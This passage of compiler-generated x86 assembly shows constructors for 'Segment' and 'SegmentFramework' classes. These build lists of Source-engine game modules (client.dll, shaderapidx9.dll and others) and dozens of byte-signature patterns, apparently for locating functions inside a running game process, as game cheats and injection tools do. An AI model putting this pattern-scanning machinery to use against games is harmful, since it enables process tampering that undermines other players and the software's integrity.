  000a0	8b e5		 mov	 esp, ebp
  000a2	5d		 pop	 ebp
  000a3	c3		 ret	 0
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__unwindfunclet$??0Segment@@QAE@XZ$2:
  00000	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00003	e9 00 00 00 00	 jmp	 ??1?$map@PBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@U?$less@PBD@2@V?$allocator@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@2@@std@@QAE@XZ
__unwindfunclet$??0Segment@@QAE@XZ$3:
  00008	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  0000b	83 c1 08	 add	 ecx, 8
  0000e	e9 00 00 00 00	 jmp	 ??1?$vector@KV?$allocator@K@std@@@std@@QAE@XZ ; std::vector<unsigned long,std::allocator<unsigned long> >::~vector<unsigned long,std::allocator<unsigned long> >
__unwindfunclet$??0Segment@@QAE@XZ$0:
  00013	8b 4d f0	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	e9 00 00 00 00	 jmp	 ??1SegmentHeader@@QAE@XZ
  0001b	cc		 int	 3
  0001c	cc		 int	 3
  0001d	cc		 int	 3
  0001e	cc		 int	 3
  0001f	cc		 int	 3
__ehhandler$??0Segment@@QAE@XZ:
  00020	90		 npad	 1
  00021	90		 npad	 1
  00022	8b 54 24 08	 mov	 edx, DWORD PTR [esp+8]
  00026	8d 42 0c	 lea	 eax, DWORD PTR [edx+12]
  00029	8b 4a ec	 mov	 ecx, DWORD PTR [edx-20]
  0002c	33 c8		 xor	 ecx, eax
  0002e	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00033	b8 00 00 00 00	 mov	 eax, OFFSET __ehfuncinfo$??0Segment@@QAE@XZ
  00038	e9 00 00 00 00	 jmp	 ___CxxFrameHandler3
text$x	ENDS
??0Segment@@QAE@XZ ENDP					; Segment::Segment
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\initializer_list
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\initializer_list
;	COMDAT ??0SegmentFramework@@QAE@XZ
_TEXT	SEGMENT
_this$GSCopy$ = -384					; size = 4
$T21 = -380						; size = 344
$T17 = -36						; size = 16
$T3 = -20						; size = 8
_this$ = -16						; size = 4
__$EHRec$ = -12						; size = 12
??0SegmentFramework@@QAE@XZ PROC			; SegmentFramework::SegmentFramework, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	6a ff		 push	 -1
  00005	68 00 00 00 00	 push	 __ehhandler$??0SegmentFramework@@QAE@XZ
  0000a	64 a1 00 00 00
	00		 mov	 eax, DWORD PTR fs:0
  00010	50		 push	 eax
  00011	81 ec 74 01 00
	00		 sub	 esp, 372		; 00000174H
  00017	56		 push	 esi
  00018	57		 push	 edi
  00019	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0001e	33 c5		 xor	 eax, ebp
  00020	50		 push	 eax
  00021	8d 45 f4	 lea	 eax, DWORD PTR __$EHRec$[ebp]
  00024	64 a3 00 00 00
	00		 mov	 DWORD PTR fs:0, eax
  0002a	8b f9		 mov	 edi, ecx
  0002c	89 7d f0	 mov	 DWORD PTR _this$[ebp], edi

; 36   :         : _First(_First_arg), _Last(_Last_arg) {}

  0002f	89 bd 80 fe ff
	ff		 mov	 DWORD PTR _this$GSCopy$[ebp], edi
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1663 :         _Buy_raw(_Newcapacity);

  00035	6a 01		 push	 1
  00037	c7 45 ec 50 a2
	95 00		 mov	 DWORD PTR $T3[ebp], 9806416 ; 0095a250H
  0003e	c7 45 f0 28 39
	00 00		 mov	 DWORD PTR $T3[ebp+4], 14632 ; 00003928H

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  00045	c7 07 00 00 00
	00		 mov	 DWORD PTR [edi], 0
  0004b	c7 47 04 00 00
	00 00		 mov	 DWORD PTR [edi+4], 0
  00052	c7 47 08 00 00
	00 00		 mov	 DWORD PTR [edi+8], 0

; 1663 :         _Buy_raw(_Newcapacity);

  00059	e8 00 00 00 00	 call	 ?_Buy_raw@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXI@Z ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Buy_raw

; 1588 :         return _Uninitialized_copy(_First, _Last, _Dest, _Getal());

  0005e	8b 37		 mov	 esi, DWORD PTR [edi]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00060	8d 45 ec	 lea	 eax, DWORD PTR $T3[ebp]
  00063	6a 08		 push	 8
  00065	50		 push	 eax
  00066	56		 push	 esi
  00067	e8 00 00 00 00	 call	 _memmove
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  0006c	8d 46 08	 lea	 eax, DWORD PTR [esi+8]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 497  :             _My_data._Mylast = _Ucopy(_First, _Last, _My_data._Myfirst);

  0006f	89 47 04	 mov	 DWORD PTR [edi+4], eax
  00072	83 c4 08	 add	 esp, 8
  00075	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR __$EHRec$[ebp+8], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\initializer_list

; 36   :         : _First(_First_arg), _Last(_Last_arg) {}

  0007c	8d 45 ec	 lea	 eax, DWORD PTR $T17[ebp+16]
  0007f	c7 45 dc 00 00
	00 00		 mov	 DWORD PTR $T17[ebp], OFFSET ??_C@_0L@PHFEFMEF@client?4dll@
  00086	8d 55 dc	 lea	 edx, DWORD PTR $T17[ebp]
  00089	c7 45 e0 00 00
	00 00		 mov	 DWORD PTR $T17[ebp+4], OFFSET ??_C@_0BD@NKPNDPNB@vguimatsurface?4dll@
  00090	8d 4f 0c	 lea	 ecx, DWORD PTR [edi+12]
  00093	c7 45 e4 00 00
	00 00		 mov	 DWORD PTR $T17[ebp+8], OFFSET ??_C@_0BB@IDMFBLEL@shaderapidx9?4dll@
  0009a	50		 push	 eax
  0009b	52		 push	 edx
  0009c	c7 45 e8 00 00
	00 00		 mov	 DWORD PTR $T17[ebp+12], OFFSET ??_C@_0M@EINGCJHB@vstdlib?4dll@
  000a3	e8 00 00 00 00	 call	 ??0?$vector@PBDV?$allocator@PBD@std@@@std@@QAE@V?$initializer_list@PBD@1@ABV?$allocator@PBD@1@@Z ; std::vector<char const *,std::allocator<char const *> >::vector<char const *,std::allocator<char const *> >
  000a8	c6 45 fc 01	 mov	 BYTE PTR __$EHRec$[ebp+8], 1
  000ac	c7 85 84 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp], OFFSET ??_C@_0CB@KJIDDANE@55?58B?5EC?583?5E4?5F8?583?5EC?570?56A?55@
  000b6	c7 85 88 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+4], OFFSET ??_C@_0BK@EOKMOEOO@56?56A?501?568?5?$DP?5?$DP?5?$DP?5?$DP?58B?5F1@
  000c0	c7 85 8c fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+8], OFFSET ??_C@_0DF@CJDDHIEG@55?58B?5EC?583?5E4?5F8?551?553?556?557?58@
  000ca	c7 85 90 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+12], OFFSET ??_C@_0CK@CMLHGGBK@55?58B?5EC?583?5E4?5F8?583?5EC?564?553?55@
  000d4	c7 85 94 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+16], OFFSET ??_C@_0BL@DOALEGMD@51?556?58B?5F1?585?5F6?574?568?583@
  000de	c7 85 98 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+20], OFFSET ??_C@_0CB@IJIMFMOE@55?58B?5EC?553?58B?55D?508?556?58B?5F1?58@
  000e8	c7 85 9c fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+24], OFFSET ??_C@_0CH@JIFLMJLL@55?58B?5EC?583?5E4?5C0?583?5EC?534?553?55@
  000f2	c7 85 a0 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+28], OFFSET ??_C@_0BK@GLHNJMEN@8B?50D?5?$DP?5?$DP?5?$DP?5?$DP?58B?546?508?568@
  000fc	c7 85 a4 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+32], OFFSET ??_C@_0BI@HDJCOIJC@55?58B?5EC?556?58B?5F1?551?58D@
  00106	c7 85 a8 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+36], OFFSET ??_C@_0DL@EIBMNNHJ@55?58B?5EC?583?5E4?5F8?581?5EC?5?$DP?5?$DP?5?$DP?5?$DP@
  00110	c7 85 ac fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+40], OFFSET ??_C@_0CD@EIEEDCML@55?58B?5EC?5FF?575?518?5F3?50F?510?545?5?$DP@
  0011a	c7 85 b0 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+44], OFFSET ??_C@_0CI@KPMIAJJE@55?58B?5EC?551?556?58B?5F1?580?5BE?5?$DP?5?$DP?5@
  00124	c7 85 b4 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+48], OFFSET ??_C@_0DJ@CEFDOBKF@8B?535?5?$DP?5?$DP?5?$DP?5?$DP?5FF?590?5?$DP?5?$DP?5?$DP?5?$DP?550?5@
  0012e	c7 85 b8 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+52], OFFSET ??_C@_0CK@DFKOCHGN@B9?5?$DP?5?$DP?5?$DP?5?$DP?5A1?5?$DP?5?$DP?5?$DP?5?$DP?5FF?510?5A1?5@
  00138	c7 85 bc fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+56], OFFSET ??_C@_0CE@KJGDCOM@0F?544?5C8?533?5C0?55E?539?511?50F?594?5C@
  00142	c7 85 c0 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+60], OFFSET ??_C@_0M@MACNFAAE@B0?501?583?5FE@
  0014c	c7 85 c4 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+64], OFFSET ??_C@_0BH@PAMFABDB@B9?5?$DP?5?$DP?5?$DP?5?$DP?5FF?550?514?55F@
  00156	c7 85 c8 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+68], OFFSET ??_C@_0CJ@JOAILMAE@81?5C6?5?$DP?5?$DP?5?$DP?5?$DP?58B?54E?50C?58B?556?504@
  00160	c7 85 cc fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+72], OFFSET ??_C@_0CD@FHMDKEH@55?58B?5EC?551?556?58B?535?5?$DP?5?$DP?5?$DP?5?$DP?557@
  0016a	c7 85 d0 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+76], OFFSET ??_C@_0CL@EEFECCOM@C7?500?5?$DP?5?$DP?5?$DP?5?$DP?5E8?5?$DP?5?$DP?5?$DP?5?$DP?583?5EC?5@
  00174	c7 85 d4 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+80], OFFSET ??_C@_0CD@CLINDDEG@55?58B?5EC?583?5EC?508?58B?515?5?$DP?5?$DP?5?$DP?5?$DP@
  0017e	c7 85 d8 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+84], OFFSET ??_C@_0BG@GPJJHLHE@80?5B9?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?575?56C@
  00188	c7 85 dc fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+88], OFFSET ??_C@_0BP@PMDLCGGD@83?53D?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?557?58B?5F9?575?506@
  00192	c7 85 e0 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+92], OFFSET ??_C@_0BB@MBFPJFAI@A1?5?$DP?5?$DP?5?$DP?5?$DP?574?538@
  0019c	c7 85 e4 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+96], OFFSET ??_C@_0CK@MBPLAPBK@55?58B?5EC?553?58B?55D?508?556?557?58B?5F@
  001a6	c7 85 e8 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+100], OFFSET ??_C@_0CM@PPIJPEML@55?58B?5EC?556?58B?575?50C?557?58B?5F9?5B@
  001b0	c7 85 ec fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+104], OFFSET ??_C@_0CE@PNFFJNMC@B9?5?$DP?5?$DP?5?$DP?5?$DP?5A3?5?$DP?5?$DP?5?$DP?5?$DP?5E8?5?$DP?5?$DP?5?$DP?5@
  001ba	c7 85 f0 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+108], OFFSET ??_C@_0BO@BNNHFHPN@55?58B?5EC?583?5EC?50C?553?556?58B?571@
  001c4	c7 85 f4 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+112], OFFSET ??_C@_0DH@FGAABEAA@B9?5?$DP?5?$DP?5?$DP?5?$DP?5E8?5?$DP?5?$DP?5?$DP?5?$DP?585?5C0?574?5@
  001ce	c7 85 f8 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+116], OFFSET ??_C@_0CH@CEFANBNE@55?58B?5EC?551?553?556?58B?575?508?58B?5D@
  001d8	c7 85 fc fe ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+120], OFFSET ??_C@_0HD@POPCBNPK@0F?584?5?$DP?5?$DP?5?$DP?5?$DP?58B?588?5?$DP?5?$DP?5?$DP?5?$DP?583?5@
  001e2	c7 85 00 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+124], OFFSET ??_C@_0BC@HMEMPFIB@84?5C0?574?517?58B?587@
  001ec	c7 85 04 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+128], OFFSET ??_C@_0CG@FFELLHH@84?5C0?574?50A?5F3?50F?510?505?5?$DP?5?$DP?5?$DP?5?$DP@
  001f6	c7 85 08 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+132], OFFSET ??_C@_0BE@DLMGOELC@8B?597?5?$DP?5?$DP?5?$DP?5?$DP?556?58B@
  00200	c7 85 0c ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+136], OFFSET ??_C@_0CB@EHCBCFDJ@55?58B?5EC?583?5E4?5F0?583?5EC?57C?556?5F@
  0020a	c7 85 10 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+140], OFFSET ??_C@_0BL@NILMMPDH@55?58B?5EC?58D?551?508?58B?54D?508@
  00214	c7 85 14 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+144], OFFSET ??_C@_0DB@NJMJDNKE@55?58B?5EC?556?58B?535?5?$DP?5?$DP?5?$DP?5?$DP?585?5F6@
  0021e	c7 85 18 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+148], OFFSET ??_C@_0CF@GJBCBAFI@8B?501?5FF?5B1?5?$DP?5?$DP?5?$DP?5?$DP?5FF?590?5?$DP?5?$DP?5?$DP@
  00228	c7 85 1c ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+152], OFFSET ??_C@_0BI@BINPCKGE@55?58B?5EC?583?5EC?558?556?557@
  00232	c7 85 20 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+156], OFFSET ??_C@_0BI@PHFBLDMI@53?556?58B?5F1?557?58B?54E?53C@
  0023c	c7 85 24 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+160], OFFSET ??_C@_0CB@FABLCKIN@55?58B?5EC?556?58B?575?508?557?5FF?575?51@
  00246	c7 85 28 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+164], OFFSET ??_C@_0DG@PEDGIBOM@55?58B?5EC?583?5E4?5F8?583?5EC?50C?553?55@
  00250	c7 85 2c ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+168], OFFSET ??_C@_0CN@OIDCGODA@55?58B?5EC?583?5E4?5F8?583?5EC?50C?553?58@
  0025a	c7 85 30 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+172], OFFSET ??_C@_0CN@EECAACMO@55?58B?5EC?583?5E4?5F8?583?5EC?51C?553?55@
  00264	c7 85 34 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+176], OFFSET ??_C@_0BN@IIAHNBAC@F3?50F?510?5A6?5?$DP?5?$DP?5?$DP?5?$DP?5F3?50F?511@
  0026e	c7 85 38 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+180], OFFSET ??_C@_0CJ@IBABLOEE@56?58B?5F1?58B?50D?5?$DP?5?$DP?5?$DP?5?$DP?557?58B?501@
  00278	c7 85 3c ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+184], OFFSET ??_C@_0CD@FBPNHNGE@55?58B?5EC?583?5EC?510?5A1?5?$DP?5?$DP?5?$DP?5?$DP?589@
  00282	c7 85 40 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+188], OFFSET ??_C@_0CP@PEBOMIDC@57?58B?5F9?58B?507?58B?580?5?$DP?5?$DP?5?$DP?5?$DP?5FF@
  0028c	c7 85 44 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+192], OFFSET ??_C@_0DA@OAEFGDOI@55?58B?5EC?583?5E4?5F8?583?5EC?55C?553?58@
  00296	c7 85 48 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+196], OFFSET ??_C@_0CH@OFLNLCEJ@55?58B?5EC?583?5E4?5F8?583?5EC?530?556?55@
  002a0	8d 8d 84 fe ff
	ff		 lea	 ecx, DWORD PTR $T21[ebp]
  002a6	c7 85 4c ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+200], OFFSET ??_C@_0DF@HBNAIIIO@55?58B?5EC?556?5FF?575?508?58B?5F1?58B?50@
  002b0	51		 push	 ecx
  002b1	8d 45 dc	 lea	 eax, DWORD PTR $T21[ebp+344]
  002b4	c7 85 50 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+204], OFFSET ??_C@_0BC@NOOJPJHB@85?5C0?575?530?538?586@
  002be	50		 push	 eax
  002bf	51		 push	 ecx
  002c0	8d 4f 18	 lea	 ecx, DWORD PTR [edi+24]
  002c3	c7 85 54 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+208], OFFSET ??_C@_0BD@LIBFMOBN@C7?546?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?543@
  002cd	c7 85 58 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+212], OFFSET ??_C@_0BC@CLEEDAAD@85?5C0?574?52D?583?57D@
  002d7	c7 85 5c ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+216], OFFSET ??_C@_0P@CGNIIJII@75?504?5B0?501?55F@
  002e1	c7 85 60 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+220], OFFSET ??_C@_0BC@LFBMICMP@84?5C0?575?50D?5F6?587@
  002eb	c7 85 64 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+224], OFFSET ??_C@_0CG@FHMIJDND@84?5C0?575?538?58B?50D?5?$DP?5?$DP?5?$DP?5?$DP?58B?501@
  002f5	c7 85 68 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+228], OFFSET ??_C@_0CE@LKCAGEIP@84?5C0?575?509?55F?55E?55B?58B?5E5?55D?5C@
  002ff	c7 85 6c ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+232], OFFSET ??_C@_0CJ@FCOBLFNE@55?58B?5EC?581?5EC?5?$DP?5?$DP?5?$DP?5?$DP?553?556?557@
  00309	c7 85 70 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+236], OFFSET ??_C@_0BK@GIPFPJPJ@F3?50F?510?54D?5?$DP?584?5C0?574?512@
  00313	c7 85 74 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+240], OFFSET ??_C@_0BE@NOPHJDIG@FF?5D0?5A1?5?$DP?5?$DP?5?$DP?5?$DP?5B9@
  0031d	c7 85 78 ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+244], OFFSET ??_C@_0BH@MDINMCPF@E8?5?$DP?5?$DP?5?$DP?5?$DP?5FF?576?50C?58D@
  00327	c7 85 7c ff ff
	ff 00 00 00 00	 mov	 DWORD PTR $T21[ebp+248], OFFSET ??_C@_0CK@NDFMKNFD@80?53D?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?574?516?5A1?5?$DP?5?$DP?5?$DP?5@
  00331	c7 45 80 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+252], OFFSET ??_C@_0DH@GGEIJINE@8B?535?5?$DP?5?$DP?5?$DP?5?$DP?5FF?510?50F?5B7?5C0?5B9@
  00338	c7 45 84 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+256], OFFSET ??_C@_0BG@DEDHDCDI@83?5BE?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?57F?567@
  0033f	c7 45 88 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+260], OFFSET ??_C@_0CA@CCMNJOJN@E8?5?$DP?5?$DP?5?$DP?5?$DP?5EB?502?533?5C0?557?58B?5BE@
  00346	c7 45 8c 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+264], OFFSET ??_C@_0CG@HDEAFJAI@E8?5?$DP?5?$DP?5?$DP?5?$DP?58B?5D0?585?5D2?575?507?532@
  0034d	c7 45 90 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+268], OFFSET ??_C@_0DC@HPKDGOAA@E8?5?$DP?5?$DP?5?$DP?5?$DP?58B?546?504?55F?55E?55B?58B@
  00354	c7 45 94 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+272], OFFSET ??_C@_0M@OEHPONHC@75?54B?50F?557@
  0035b	c7 45 98 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+276], OFFSET ??_C@_0CC@NJGBBMJN@0F?5B7?505?5?$DP?5?$DP?5?$DP?5?$DP?53D?5?$DP?5?$DP?5?$DP?5?$DP?574?5@
  00362	c7 45 9c 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+280], OFFSET ??_C@_0M@OFBMICFD@56?58D?551?53C@
  00369	c7 45 a0 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+284], OFFSET ??_C@_0BN@JDGIHKEL@E8?5?$DP?5?$DP?5?$DP?5?$DP?583?57D?5D8?500?57C?50F@
  00370	c7 45 a4 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+288], OFFSET ??_C@_0DH@BDJAJANF@55?58B?5EC?583?5E4?5F8?581?5EC?5?$DP?5?$DP?5?$DP?5?$DP@
  00377	c7 45 a8 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+292], OFFSET ??_C@_0BB@HJKEOCJD@E8?5?$DP?5?$DP?5?$DP?5?$DP?599?52B@
  0037e	c7 45 ac 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+296], OFFSET ??_C@_0CF@KKAIIKCM@E8?5?$DP?5?$DP?5?$DP?5?$DP?58B?50D?5?$DP?5?$DP?5?$DP?5?$DP?50F?557?5@
  00385	c7 45 b0 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+300], OFFSET ??_C@_0M@GHAFGLNO@8D?54E?574?58B@
  0038c	c7 45 b4 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+304], OFFSET ??_C@_0CD@CLINDDEG@55?58B?5EC?583?5EC?508?58B?515?5?$DP?5?$DP?5?$DP?5?$DP@
  00393	c7 45 b8 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+308], OFFSET ??_C@_0BB@HJKEOCJD@E8?5?$DP?5?$DP?5?$DP?5?$DP?599?52B@
  0039a	c7 45 bc 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+312], OFFSET ??_C@_0CF@KKAIIKCM@E8?5?$DP?5?$DP?5?$DP?5?$DP?58B?50D?5?$DP?5?$DP?5?$DP?5?$DP?50F?557?5@
  003a1	c7 45 c0 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+316], OFFSET ??_C@_0CB@HIJCDHC@8B?50D?5?$DP?5?$DP?5?$DP?5?$DP?5F6?587?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?58@
  003a8	c7 45 c4 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+320], OFFSET ??_C@_0BN@NCEFIOGI@55?58B?5EC?5F3?50F?510?545?5?$DP?556?56A@
  003af	c7 45 c8 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+324], OFFSET ??_C@_0CE@IFHNNPNM@55?58B?5EC?583?5E4?5F8?58B?545?50C?583?5E@
  003b6	c7 45 cc 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+328], OFFSET ??_C@_0BI@EHNMLEME@FF?550?518?589?544?524?514?5EB@
  003bd	c7 45 d0 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+332], OFFSET ??_C@_0BE@MLEIBKML@A2?5?$DP?5?$DP?5?$DP?5?$DP?58B?545?5E8@
  003c4	c7 45 d4 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+336], OFFSET ??_C@_0CB@LHJAFMPF@55?58B?5EC?583?5E4?5F8?551?553?556?58B?5D@
  003cb	c7 45 d8 00 00
	00 00		 mov	 DWORD PTR $T21[ebp+340], OFFSET ??_C@_0BL@HOLHFMKH@55?58B?5EC?583?5EC?548?553?58B?55D@
  003d2	e8 00 00 00 00	 call	 ??0?$vector@PBDV?$allocator@PBD@std@@@std@@QAE@V?$initializer_list@PBD@1@ABV?$allocator@PBD@1@@Z ; std::vector<char const *,std::allocator<char const *> >::vector<char const *,std::allocator<char const *> >
  003d7	8b c7		 mov	 eax, edi
  003d9	8b 4d f4	 mov	 ecx, DWORD PTR __$EHRec$[ebp]
  003dc	64 89 0d 00 00
	00 00		 mov	 DWORD PTR fs:0, ecx
  003e3	59		 pop	 ecx
  003e4	5f		 pop	 edi
  003e5	5e		 pop	 esi
  003e6	8b e5		 mov	 esp, ebp
  003e8	5d		 pop	 ebp
  003e9	c3		 ret	 0
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__unwindfunclet$??0SegmentFramework@@QAE@XZ$0:
  00000	8b 8d 80 fe ff
	ff		 mov	 ecx, DWORD PTR _this$GSCopy$[ebp]
  00006	e9 00 00 00 00	 jmp	 ??1?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@XZ ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::~vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >
__unwindfunclet$??0SegmentFramework@@QAE@XZ$1:
  0000b	8b 8d 80 fe ff
	ff		 mov	 ecx, DWORD PTR _this$GSCopy$[ebp]
  00011	83 c1 0c	 add	 ecx, 12			; 0000000cH
  00014	e9 00 00 00 00	 jmp	 ??1?$vector@PBDV?$allocator@PBD@std@@@std@@QAE@XZ ; std::vector<char const *,std::allocator<char const *> >::~vector<char const *,std::allocator<char const *> >
  00019	cc		 int	 3
  0001a	cc		 int	 3
  0001b	cc		 int	 3
  0001c	cc		 int	 3
  0001d	cc		 int	 3
__ehhandler$??0SegmentFramework@@QAE@XZ:
  0001e	90		 npad	 1
  0001f	90		 npad	 1
  00020	8b 54 24 08	 mov	 edx, DWORD PTR [esp+8]
  00024	8d 42 0c	 lea	 eax, DWORD PTR [edx+12]
  00027	8b 8a 80 fe ff
	ff		 mov	 ecx, DWORD PTR [edx-384]
  0002d	33 c8		 xor	 ecx, eax
  0002f	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00034	b8 00 00 00 00	 mov	 eax, OFFSET __ehfuncinfo$??0SegmentFramework@@QAE@XZ
  00039	e9 00 00 00 00	 jmp	 ___CxxFrameHandler3
text$x	ENDS
??0SegmentFramework@@QAE@XZ ENDP			; SegmentFramework::SegmentFramework
; Function compile flags: /Ogtp
;	COMDAT ??1Segment@@QAE@XZ
_TEXT	SEGMENT
??1Segment@@QAE@XZ PROC					; Segment::~Segment, COMDAT
; _this$ = ecx
  00000	56		 push	 esi
  00001	8b f1		 mov	 esi, ecx
  00003	8d 4e 14	 lea	 ecx, DWORD PTR [esi+20]
